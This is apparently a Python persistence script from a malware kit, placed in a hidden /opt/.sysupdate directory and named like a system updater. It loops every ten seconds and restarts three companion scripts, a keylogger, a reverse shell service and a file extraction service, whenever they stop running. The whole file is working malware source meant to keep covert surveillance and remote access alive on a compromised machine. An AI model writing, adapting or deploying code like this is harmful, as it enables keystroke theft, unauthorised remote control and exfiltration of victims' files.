#!/usr/bin/python3
# /opt/.sysupdate/watchdog.py

import os
import time
import subprocess

KEYLOGGER_PATH = "/opt/.sysupdate/keylogger_agent.py"
REVERSE_SHELL_PATH = "/opt/.sysupdate/reverse_shell_service.py"
FILE_EXFIL_PATH = "/opt/.sysupdate/file_extraction_service.py"

def is_process_running(script_path):
    try:
        result = subprocess.check_output(["pgrep", "-f", script_path])
        return bool(result.strip())
    except subprocess.CalledProcessError:
        return False

def restart_service(script_path):
    try:
        subprocess.Popen(["/usr/bin/python3", script_path])
    except Exception as e:
        print(f"Failed to restart {script_path}: {e}")

def main():
    while True:
        if not os.path.exists(KEYLOGGER_PATH) or not is_process_running(KEYLOGGER_PATH):
            restart_service(KEYLOGGER_PATH)
        if not os.path.exists(REVERSE_SHELL_PATH) or not is_process_running(REVERSE_SHELL_PATH):
            restart_service(REVERSE_SHELL_PATH)
        if not os.path.exists(FILE_EXFIL_PATH) or not is_process_running(FILE_EXFIL_PATH):
            restart_service(FILE_EXFIL_PATH)
        time.sleep(10)

if __name__ == "__main__":
    main()
